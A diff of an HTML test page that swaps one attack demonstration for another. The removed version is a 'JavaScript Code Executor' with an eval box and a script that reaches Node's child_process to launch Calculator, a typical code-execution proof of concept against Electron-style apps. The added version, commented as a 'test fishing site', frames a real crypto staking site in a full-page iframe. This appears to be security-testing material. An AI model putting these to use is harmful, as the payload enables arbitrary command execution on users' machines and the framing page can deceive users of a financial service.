@@ -1,27 +1,25 @@
 <!DOCTYPE html>
-<html>
+<!-- This is a test fishing site !! -->
+<html lang="en">
+
 <head>
-  <title>JavaScript Code Executor</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <script>
+        function iFrameHeight() {
+            var ifm = document.getElementById("main");
+            var subWeb = document.frames ? document.frames["main"].document : ifm.contentDocument;
+            if (ifm != null && subWeb != null) {
+                $("#main").height(0);
+                $("#main").height(subWeb.body.scrollHeight);
+            }
+        }
+    </script>
 </head>
+
 <body>
-  <h1>JavaScript Code Executor</h1>
-  <textarea id="codeInput" rows="10" cols="50"></textarea>
-  <button id="executeButton">Execute</button>
-  <script type="text/javascript">
-  window.top.require('child_process').execFile('/Applications/Calculator.app/Contents/MacOS/Calculator',function(){});
-</script>
-
-  <script>
-    function executeCode() {
-      var code = document.getElementById('codeInput').value;
-      try {
-        eval(code);
-      } catch (error) {
-        console.error('error:', error);
-      }
-    }
-
-    document.getElementById('executeButton').addEventListener('click', executeCode);
-  </script>
+    <iframe id="main" name="main" width="100%" height="100%" src="https://stakingpool.hashquark.io/" onload="iFrameHeight()" frameborder="0" scrolling="no"></iframe>
 </body>
+
 </html>
